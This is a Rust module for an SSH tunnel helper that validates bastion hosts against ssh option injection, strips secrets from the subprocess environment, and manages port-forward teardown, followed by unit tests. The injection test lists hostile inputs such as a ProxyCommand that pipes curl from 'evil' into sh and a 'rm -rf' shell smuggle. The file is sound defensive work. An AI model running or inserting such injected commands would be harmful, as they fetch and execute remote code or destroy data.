//! SSH tunnel: shell out to the system `ssh` to open a local port forward to a
//! database behind a bastion (DESIGN §2). Pure command-building lives here
//! (`parse_host`, `ssh_args`, the validators) and is unit-tested without a
//! network; the imperative shell (`open`: pick a port, spawn `ssh`, map
//! failures) is the only IO. Depends only on std (net/process/fs) — no sqlx,
//! no config.
//!
//! We never speak the SSH protocol ourselves (Д8: no `russh`): the system
//! binary inherits `~/.ssh/config`, keys, agent and `ProxyJump` for free, and
//! `ControlMaster=auto`/`ControlPersist` over a stable `ControlPath` reuse the
//! master between runs so the second `nyet` call pays no handshake (Д9).
//!
//! LIFECYCLE: `open` returns a `Tunnel` guard that lives only for the current
//! query; its `Drop` removes the forward so nothing accumulates across a
//! session. Two teardown modes (verified against a real bastion):
//!   * with a `ControlPath` (a persistent master exists), the `-L` forward is
//!     owned by the master and outlives its client, so it must be removed
//!     explicitly with `ssh -O cancel -L ...` — this leaves the master up for
//!     reuse (the intended cheap warm path);
//!   * without a `ControlPath` (no master), a plain `ssh -N -L` child owns the
//!     forward, so killing that child removes it.
//!
//! Either way: master reused where possible, forward gone at query end.
//!
//! SECURITY: `host`/`remote` come from the config, where `${VAR}` substitution
//! makes them agent-influenced (the threat model treats the environment as
//! agent-controlled). The strict validation below (no leading `-`, a safe
//! character set) is the guard against ssh option injection — a `host` like
//! `-oProxyCommand=...` would otherwise run arbitrary code on the nyet host.
//! `ssh` has no `--` to end options (verified: not in its usage), so validation
//! is the only line of defence and runs both at config parse (fail-fast, exit 3)
//! and here before the argv is built.

use std::io::Read;
use std::net::{TcpListener, TcpStream};
use std::num::NonZeroU16;
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant};

/// Keep only the env vars `ssh` legitimately needs; everything else — notably
/// the DB password from `password_env`, which nyet holds in its own env — is
/// dropped so the ssh subprocess (and any ProxyCommand helper it spawns, or any
/// local reader of /proc/PID/environ) never sees it. ssh needs no DB password.
fn keep_env_key(key: &str) -> bool {
    matches!(
        key,
        "HOME" | "USER" | "LOGNAME" | "PATH" | "SSH_AUTH_SOCK" | "SSH_CONNECTION" | "TERM" | "LANG"
    ) || key.starts_with("LC_")
}

/// A `Command` for `ssh` with a sanitized (allowlisted) environment. Used for
/// every ssh invocation — forward setup and `-O cancel` teardown alike.
fn ssh_command() -> Command {
    let mut cmd = Command::new("ssh");
    cmd.env_clear();
    for (k, v) in std::env::vars_os() {
        if k.to_str().is_some_and(keep_env_key) {
            cmd.env(k, v);
        }
    }
    cmd
}

/// A tunnel failure. Both fields are curated, secret-free text; the cli maps
/// this onto CONNECTION_FAILED (exit 6). `ssh` does not print credentials, so
/// its stderr is safe to surface as diagnostics.
#[derive(Debug)]
pub struct TunnelError {
    pub message: String,
    pub hint: String,
}

/// A live tunnel, held by the cli for the duration of one query. Dropping it
/// tears the forward down (see the module lifecycle note) so forwards never
/// accumulate across a session.
pub struct Tunnel {
    /// The loopback port the engine connects to.
    pub local_port: u16,
    teardown: Teardown,
}

enum Teardown {
    /// Persistent-master mode: remove just this forward, leaving the master up
    /// for reuse. Holds the full `ssh -O cancel -L ...` argv.
    Cancel(Vec<String>),
    /// Standalone mode (no master): kill the child that owns the forward.
    Child(Child),
}

impl Drop for Tunnel {
    fn drop(&mut self) {
        // Best-effort: we are tearing down, and a failure here (master already
        // gone, child already dead) changes nothing.
        match &mut self.teardown {
            Teardown::Cancel(args) => {
                let _ = ssh_command().args(args.iter()).output();
            }
            Teardown::Child(child) => {
                let _ = child.kill();
                let _ = child.wait();
            }
        }
    }
}

/// A parsed `[user@]hostname[:port]`: the canonical ssh destination
/// (`[user@]hostname`, trimmed, port stripped) and the optional port for `-p`.
/// Port is `NonZeroU16` — ssh rejects port 0, so it is a config error.
#[derive(Debug, PartialEq)]
struct HostSpec {
    destination: String,
    port: Option<NonZeroU16>,
}

/// A safe host/user label: non-empty, no leading `-` (option injection), only
/// letters/digits/`.`/`-`/`_`. Deliberately strict (fail closed) — bastion
/// hostnames and usernames live comfortably inside it; exotic characters are
/// rejected rather than passed to `ssh` as a possible option.
fn valid_label(s: &str) -> bool {
    !s.is_empty()
        && !s.starts_with('-')
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_'))
}

fn bad_host(host: &str) -> TunnelError {
    TunnelError {
        message: format!("ssh host \"{host}\" is not a valid [user@]hostname[:port]"),
        hint: "use letters, digits, '.', '-', '_' only, no leading '-'; e.g. \
               deploy@bastion.corp:22. A value starting with '-' or with other \
               characters is rejected to prevent ssh option injection. IPv6 address \
               literals (e.g. [2001:db8::1]) are not supported — use a named host"
            .to_string(),
    }
}

/// Parse and validate `host` as `[user@]hostname[:port]`. ssh does not accept
/// `host:port` as a positional argument, so a `:port` suffix becomes a separate
/// `-p`. Rejects anything that could be read as an ssh option (see module docs).
fn parse_host(host: &str) -> Result<HostSpec, TunnelError> {
    let host = host.trim();
    let (user, hostport) = match host.split_once('@') {
        Some((u, rest)) => (Some(u), rest),
        None => (None, host),
    };
    let (hostname, port) = match hostport.rsplit_once(':') {
        // NonZeroU16 parse also rejects port 0 (ssh refuses it).
        Some((h, p)) => {
            let port = p.parse::<NonZeroU16>().map_err(|_| bad_host(host))?;
            (h, Some(port))
        }
        None => (hostport, None),
    };
    if !valid_label(hostname) {
        return Err(bad_host(host));
    }
    if let Some(u) = user {
        if !valid_label(u) {
            return Err(bad_host(host));
        }
    }
    let destination = match user {
        Some(u) => format!("{u}@{hostname}"),
        None => hostname.to_string(),
    };
    Ok(HostSpec { destination, port })
}

/// Parse and validate `remote` as `host:port`, returning the canonical
/// (trimmed) `host:port` that goes verbatim into `-L 127.0.0.1:<lp>:<remote>`.
/// Rejects unsafe characters / a leading `-` and requires a non-zero port —
/// fail closed. Returning the canonical string (not the raw input) is what keeps
/// validation and execution from drifting (e.g. a trailing space that passes a
/// trim-then-validate but breaks the untrimmed `-L`).
fn parse_remote(remote: &str) -> Result<String, TunnelError> {
    let bad = || TunnelError {
        message: format!("ssh remote \"{remote}\" is not a valid host:port"),
        hint: "write remote as host:port with a non-zero numeric port and safe host \
               characters, e.g. db.internal:5432. IPv6 address literals are not \
               supported — use a named host"
            .to_string(),
    };
    let (host, port) = remote.trim().rsplit_once(':').ok_or_else(bad)?;
    let port: NonZeroU16 = port.parse().map_err(|_| bad())?;
    if !valid_label(host) {
        return Err(bad());
    }
    Ok(format!("{host}:{port}"))
}

/// Parse a `control_persist` value with OpenSSH's `ControlPersist` grammar:
/// `yes`/`no`, or a time — bare seconds (`900`) or number+unit tokens from
/// s/m/h/d/w, possibly combined (`2h30m`). Returns the canonical trimmed value.
/// Rejects junk like `s1`/`fifteen`/`15x` at config parse (exit 3).
fn parse_control_persist(value: &str) -> Result<String, TunnelError> {
    let v = value.trim();
    let lower = v.to_ascii_lowercase();
    if lower == "yes" || lower == "no" || is_ssh_time(v) {
        Ok(v.to_string())
    } else {
        Err(TunnelError {
            message: format!("control_persist \"{value}\" is not a valid ControlPersist value"),
            hint: "use yes/no or a time like 900, 30s, 15m, 1h, or 2h30m".to_string(),
        })
    }
}

/// OpenSSH TIME FORMAT: one or more `<digits>[unit]` tokens, each unit one of
/// s/m/h/d/w. Must start with a digit (so `s1` is rejected) and every run of
/// non-digits must be a single valid unit (so `15x` is rejected).
fn is_ssh_time(s: &str) -> bool {
    let b = s.as_bytes();
    if b.is_empty() {
        return false;
    }
    let mut i = 0;
    while i < b.len() {
        let start = i;
        while i < b.len() && b[i].is_ascii_digit() {
            i += 1;
        }
        if i == start {
            return false; // expected digits (start, or after a unit) — got none
        }
        if i < b.len() {
            if !matches!(b[i].to_ascii_lowercase(), b's' | b'm' | b'h' | b'd' | b'w') {
                return false;
            }
            i += 1;
        }
    }
    true
}

/// Config-parse validation (returns a plain message for `ConfigError`). These
/// are the exact parsers `open` uses, run early so a bad value fails fast
/// (exit 3) instead of surfacing as a runtime tunnel error.
pub fn validate_host(host: &str) -> Result<(), String> {
    parse_host(host).map(|_| ()).map_err(|e| e.message)
}
pub fn validate_remote(remote: &str) -> Result<(), String> {
    parse_remote(remote).map(|_| ()).map_err(|e| e.message)
}
pub fn validate_control_persist(value: &str) -> Result<(), String> {
    parse_control_persist(value)
        .map(|_| ())
        .map_err(|e| e.message)
}

/// Build the `ssh` argument vector for a local forward. Pure: the caller
/// supplies the already-validated inputs and the chosen local port. `background`
/// adds `-f` (fork after the forward is up, so a successful exit means ready) —
/// used only in master mode; standalone mode keeps the process in the foreground
/// as a child. Hardening: `BatchMode=yes` fails fast instead of prompting for a
/// password (key/agent auth only); `ExitOnForwardFailure=yes` exits non-zero if
/// the forward failed; `ConnectTimeout` bounds a blackholed bastion (BatchMode
/// does not cover the TCP connect); `ControlMaster=auto` + `ControlPath` enable
/// master reuse.
fn ssh_args(
    spec: &HostSpec,
    remote: &str,
    control_persist: &str,
    control_path: Option<&str>,
    connect_timeout_secs: u64,
    local_port: u16,
    background: bool,
) -> Vec<String> {
    let mut args = Vec::new();
    if background {
        args.push("-f".to_string());
    }
    args.extend([
        "-N".to_string(),
        "-L".to_string(),
        format!("127.0.0.1:{local_port}:{remote}"),
        "-o".to_string(),
        "ControlMaster=auto".to_string(),
        "-o".to_string(),
        format!("ControlPersist={control_persist}"),
        "-o".to_string(),
        "ExitOnForwardFailure=yes".to_string(),
        "-o".to_string(),
        "BatchMode=yes".to_string(),
        "-o".to_string(),
        format!("ConnectTimeout={connect_timeout_secs}"),
    ]);
    // Always emit ControlPath explicitly. With a path (per-destination via the
    // %C hash) the master persists and the next run reuses it. Without one, emit
    // `none` — NOT omit — so a `~/.ssh/config` `Host *` ControlPath (possibly
    // overlong/stale) can't sneak in and break ssh; `none` deterministically
    // disables multiplexing (standalone mode).
    args.push("-o".to_string());
    args.push(format!("ControlPath={}", control_path.unwrap_or("none")));
    // ssh rejects host:port in the positional argument; a port is passed as -p.
    if let Some(port) = spec.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }
    // Destination must come last (after all options); validation guarantees it
    // cannot start with '-'.
    args.push(spec.destination.clone());
    args
}

/// The `ssh -O cancel -L ...` argv that removes exactly this forward from the
/// persistent master, leaving the master up for reuse.
fn cancel_args(spec: &HostSpec, remote: &str, control_path: &str, local_port: u16) -> Vec<String> {
    let mut args = vec![
        "-O".to_string(),
        "cancel".to_string(),
        "-L".to_string(),
        format!("127.0.0.1:{local_port}:{remote}"),
        "-o".to_string(),
        format!("ControlPath={control_path}"),
    ];
    if let Some(port) = spec.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }
    args.push(spec.destination.clone());
    args
}

/// Open a local SSH forward and return a `Tunnel` guard. The engine connects to
/// `127.0.0.1:<tunnel.local_port>`; dropping the guard tears the forward down.
/// `host`/`remote` are the config values (validated at config parse and
/// re-checked here); `timeout_secs` is the per-query timeout, used to bound the
/// connect.
pub fn open(
    host: &str,
    remote: &str,
    control_persist: &str,
    timeout_secs: u64,
) -> Result<Tunnel, TunnelError> {
    // Parse everything to its canonical form ONCE, then build argv only from the
    // parsed values — validation and execution can't drift.
    let spec = parse_host(host)?;
    let remote = parse_remote(remote)?;
    let control_persist = parse_control_persist(control_persist)?;
    let local_port = free_local_port()?;
    // Bound the connect so a blackholed bastion fails fast (min 1s; cap 10s so a
    // huge per-query timeout does not let the tunnel hang for minutes).
    let connect_timeout = timeout_secs.clamp(1, 10);
    match control_path() {
        // Master mode: `-f` attaches the forward to the (reusable) master; the
        // guard removes just this forward with `-O cancel` on drop.
        Some(cp) => open_via_master(
            &spec,
            &remote,
            &control_persist,
            &cp,
            connect_timeout,
            local_port,
            host,
        ),
        // Standalone mode: no master to reuse, so a foreground child owns the
        // forward and the guard kills it on drop.
        None => open_standalone(
            &spec,
            &remote,
            &control_persist,
            connect_timeout,
            local_port,
            host,
        ),
    }
}

fn open_via_master(
    spec: &HostSpec,
    remote: &str,
    control_persist: &str,
    control_path: &str,
    connect_timeout: u64,
    local_port: u16,
    host: &str,
) -> Result<Tunnel, TunnelError> {
    let args = ssh_args(
        spec,
        remote,
        control_persist,
        Some(control_path),
        connect_timeout,
        local_port,
        true, // -f: exits 0 once the forward is established
    );
    let output = ssh_command().args(&args).output().map_err(spawn_error)?;
    if !output.status.success() {
        return Err(ssh_failed(host, &String::from_utf8_lossy(&output.stderr)));
    }
    Ok(Tunnel {
        local_port,
        teardown: Teardown::Cancel(cancel_args(spec, remote, control_path, local_port)),
    })
}

fn open_standalone(
    spec: &HostSpec,
    remote: &str,
    control_persist: &str,
    connect_timeout: u64,
    local_port: u16,
    host: &str,
) -> Result<Tunnel, TunnelError> {
    let args = ssh_args(
        spec,
        remote,
        control_persist,
        None,
        connect_timeout,
        local_port,
        false, // foreground child; readiness is polled below
    );
    let mut child = ssh_command()
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(spawn_error)?;

    // Ready when the local listener accepts a connection; bounded by the connect
    // timeout (+1s slack). If ssh exits first (auth/forward failure), surface it.
    let deadline = Instant::now() + Duration::from_secs(connect_timeout + 1);
    loop {
        if TcpStream::connect_timeout(
            &([127, 0, 0, 1], local_port).into(),
            Duration::from_millis(100),
        )
        .is_ok()
        {
            return Ok(Tunnel {
                local_port,
                teardown: Teardown::Child(child),
            });
        }
        if let Ok(Some(_status)) = child.try_wait() {
            let mut stderr = String::new();
            if let Some(mut s) = child.stderr.take() {
                let _ = s.read_to_string(&mut stderr);
            }
            return Err(ssh_failed(host, &stderr));
        }
        if Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            return Err(ssh_failed(
                host,
                "timed out waiting for the SSH forward to become ready",
            ));
        }
        std::thread::sleep(Duration::from_millis(50));
    }
}

fn spawn_error(e: std::io::Error) -> TunnelError {
    if e.kind() == std::io::ErrorKind::NotFound {
        TunnelError {
            message: "the `ssh` binary was not found on PATH".to_string(),
            hint: "install an OpenSSH client (ssh) and ensure it is on PATH; \
                   nyet shells out to the system ssh for tunnels"
                .to_string(),
        }
    } else {
        TunnelError {
            message: format!("failed to run ssh: {e}"),
            hint: "check that the system ssh client is installed and executable".to_string(),
        }
    }
}

fn ssh_failed(host: &str, stderr: &str) -> TunnelError {
    let detail = stderr.trim();
    let detail = if detail.is_empty() {
        "ssh did not establish the forward".to_string()
    } else {
        detail.to_string()
    };
    TunnelError {
        message: format!("could not open the SSH tunnel to \"{host}\": {detail}"),
        hint: "check that the bastion is reachable and that key/agent auth works \
               non-interactively (nyet uses BatchMode: no password prompt). On a first \
               connection add the bastion's key to known_hosts (connect once by hand) — \
               nyet does not auto-accept host keys. Try the same `ssh -N -L ...` yourself; \
               ProxyJump and keys come from ~/.ssh/config"
            .to_string(),
    }
}

/// A stable per-destination `ControlPath` under a runtime dir, so a background
/// master survives between `nyet` invocations and the next run reuses it. `%C`
/// (ssh's hash of localhost/remotehost/port/user) keys one socket per
/// destination. Returns None if no writable dir is available (reuse then just
/// does not happen — the tunnel still works).
fn control_path() -> Option<String> {
    let dir = control_dir()?;
    let path = dir.join("cm-%C");
    // A too-long path makes ssh error ("ControlPath too long", limit ~104/108).
    // Degrade to no-reuse rather than fail the whole tunnel.
    if control_path_too_long(&path) {
        return None;
    }
    std::fs::create_dir_all(&dir).ok()?;
    Some(path.to_string_lossy().into_owned())
}

/// `%C` (2 chars in the literal) expands to ssh's ~40-char connection hash; the
/// resulting unix-socket path must stay under the OS limit (macOS 104 / Linux
/// 108). Conservative cap at 100 with margin. Pure — unit-tested.
fn control_path_too_long(path: &std::path::Path) -> bool {
    path.as_os_str().len().saturating_sub(2) + 40 >= 100
}

fn control_dir() -> Option<PathBuf> {
    if let Some(x) = std::env::var_os("XDG_RUNTIME_DIR").filter(|v| !v.is_empty()) {
        return Some(PathBuf::from(x).join("nyet"));
    }
    let home = std::env::var_os("HOME").filter(|h| !h.is_empty())?;
    Some(PathBuf::from(home).join(".ssh/nyet"))
}

/// Grab a free TCP port by binding 127.0.0.1:0 and reading the assigned port,
/// then release it for ssh to bind.
///
/// ponytail: TOCTOU race between releasing this socket and ssh binding it — each
/// run binds a fresh local port (master reuse removes the handshake, not the
/// local bind), so the window exists on every call. It is tiny and a collision
/// just fails the tunnel with a clear error; retry-on-EADDRINUSE if it ever bites.
fn free_local_port() -> Result<u16, TunnelError> {
    let listener = TcpListener::bind("127.0.0.1:0").map_err(|e| TunnelError {
        message: format!("could not reserve a local port for the SSH tunnel: {e}"),
        hint: "check that the loopback interface is available".to_string(),
    })?;
    let port = listener.local_addr().map_err(|e| TunnelError {
        message: format!("could not read the reserved local port: {e}"),
        hint: "check that the loopback interface is available".to_string(),
    })?;
    Ok(port.port())
    // listener dropped here -> port released for ssh.
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_user_host_port() {
        let s = parse_host("deploy@bastion.corp:22").unwrap();
        assert_eq!(s.destination, "deploy@bastion.corp");
        assert_eq!(s.port, NonZeroU16::new(22));
    }

    #[test]
    fn parses_host_without_port_or_user() {
        let s = parse_host("bastion.corp").unwrap();
        assert_eq!(s.destination, "bastion.corp");
        assert_eq!(s.port, None);
        let s = parse_host("bastion.corp:2222").unwrap();
        assert_eq!(s.destination, "bastion.corp");
        assert_eq!(s.port, NonZeroU16::new(2222));
    }

    #[test]
    fn rejects_non_numeric_empty_and_zero_port() {
        assert!(parse_host("bastion.corp:notaport").is_err());
        assert!(parse_host("deploy@:22").is_err());
        assert!(parse_host("").is_err());
        // Port 0 is rejected (ssh refuses it) — NonZeroU16.
        assert!(parse_host("bastion:0").is_err());
        assert!(parse_remote("host:0").is_err());
    }

    #[test]
    fn parse_trims_and_canonicalizes() {
        // Leading/trailing whitespace must not survive into the argv.
        let s = parse_host("  deploy@bastion.corp:22  ").unwrap();
        assert_eq!(s.destination, "deploy@bastion.corp");
        assert_eq!(s.port, NonZeroU16::new(22));
        assert_eq!(
            parse_remote("  db.internal:5432 ").unwrap(),
            "db.internal:5432"
        );
        assert_eq!(parse_control_persist("  15m ").unwrap(), "15m");
    }

    #[test]
    fn keep_env_allowlists_ssh_vars_and_drops_secrets() {
        for keep in ["HOME", "PATH", "SSH_AUTH_SOCK", "USER", "LANG", "LC_ALL"] {
            assert!(keep_env_key(keep), "{keep} should be kept");
        }
        // The DB password (from password_env) and anything else must be dropped.
        for drop in [
            "PROD_DB_PASSWORD",
            "NYET_PG_TEST_PW",
            "AWS_SECRET_ACCESS_KEY",
        ] {
            assert!(!keep_env_key(drop), "{drop} must be dropped");
        }
    }

    /// The RCE guard: an option-injection host (leading `-`, or after a
    /// substituted ${VAR}) is rejected before it can reach ssh's argv.
    #[test]
    fn rejects_ssh_option_injection() {
        for host in [
            "-oProxyCommand=sh -c \"curl evil|sh\"",
            "-oProxyCommand=x",
            "-Fnope",
            "deploy@-oProxyCommand=x", // user side
            "host name",               // space
            "host;rm -rf",             // shell meta
            "-",                       // lone dash
        ] {
            assert!(parse_host(host).is_err(), "must reject {host:?}");
        }
        // remote is embedded after 127.0.0.1: but still validated.
        for remote in [
            "-oProxyCommand=x:5432",
            "db.internal:notaport",
            "db.internal",
        ] {
            assert!(
                parse_remote(remote).is_err(),
                "must reject remote {remote:?}"
            );
        }
        assert_eq!(
            parse_remote("db.internal:5432").unwrap(),
            "db.internal:5432"
        );
    }

    #[test]
    fn ssh_args_carry_all_hardening_options_and_forward() {
        let spec = parse_host("deploy@bastion.corp:22").unwrap();
        let args = ssh_args(
            &spec,
            "db.internal:5432",
            "15m",
            Some("/run/user/1000/nyet/cm-%C"),
            10,
            54321,
            true, // background (master mode)
        );
        assert!(args.contains(&"127.0.0.1:54321:db.internal:5432".to_string()));
        assert!(args.contains(&"-f".to_string()));
        assert!(args.contains(&"-N".to_string()));
        for opt in [
            "ControlMaster=auto",
            "ControlPersist=15m",
            "ExitOnForwardFailure=yes",
            "BatchMode=yes",
            "ConnectTimeout=10",
            "ControlPath=/run/user/1000/nyet/cm-%C",
        ] {
            assert!(args.contains(&opt.to_string()), "missing -o {opt}");
        }
        assert!(args.windows(2).any(|w| w == ["-p", "22"]));
        assert_eq!(args.last().unwrap(), "deploy@bastion.corp");
    }

    #[test]
    fn ssh_args_foreground_emits_control_path_none() {
        let spec = parse_host("bastion.corp").unwrap();
        let args = ssh_args(&spec, "10.0.0.1:5432", "1h", None, 5, 40000, false);
        // Standalone (child) mode: no -f, no -p, and ControlPath explicitly
        // `none` (not omitted) so ~/.ssh/config can't inject a stale path.
        assert!(!args.contains(&"-f".to_string()));
        assert!(args.contains(&"ControlPersist=1h".to_string()));
        assert!(args.contains(&"ConnectTimeout=5".to_string()));
        assert!(!args.contains(&"-p".to_string()));
        assert!(args.contains(&"ControlPath=none".to_string()));
        assert_eq!(args.last().unwrap(), "bastion.corp");
    }

    #[test]
    fn cancel_args_target_the_specific_forward() {
        let spec = parse_host("deploy@bastion.corp:22").unwrap();
        let args = cancel_args(
            &spec,
            "db.internal:5432",
            "/run/user/1000/nyet/cm-%C",
            54321,
        );
        assert!(args.windows(2).any(|w| w == ["-O", "cancel"]));
        assert!(args.contains(&"127.0.0.1:54321:db.internal:5432".to_string()));
        assert!(args.contains(&"ControlPath=/run/user/1000/nyet/cm-%C".to_string()));
        assert!(args.windows(2).any(|w| w == ["-p", "22"]));
        assert_eq!(args.last().unwrap(), "deploy@bastion.corp");
    }

    #[test]
    fn control_persist_grammar() {
        // yes/no, bare seconds, single unit, and combinations all pass.
        // `1h30` = 1h + 30s (trailing bare-seconds run) is valid too.
        for ok in [
            "yes", "no", "0", "30", "30s", "15m", "1h", "2h30m", "900", "1h30",
        ] {
            assert!(validate_control_persist(ok).is_ok(), "{ok} should pass");
        }
        // Leading unit, bad unit, bare words, empty — all rejected.
        for bad in ["s1", "fifteen", "", "15x", "m", "abc"] {
            assert!(validate_control_persist(bad).is_err(), "{bad} should fail");
        }
    }

    #[test]
    fn control_path_length_guard() {
        // A short path is fine; a deep one (e.g. a nested temp HOME) is skipped
        // so ssh never errors "ControlPath too long".
        assert!(!control_path_too_long(std::path::Path::new(
            "/run/user/1000/nyet/cm-%C"
        )));
        let deep = format!("/{}/nyet/cm-%C", "a".repeat(90));
        assert!(control_path_too_long(std::path::Path::new(&deep)));
    }

    #[test]
    fn free_local_port_returns_a_usable_port() {
        let port = free_local_port().unwrap();
        assert_ne!(port, 0);
        TcpListener::bind(("127.0.0.1", port)).expect("port should be free after release");
    }
}
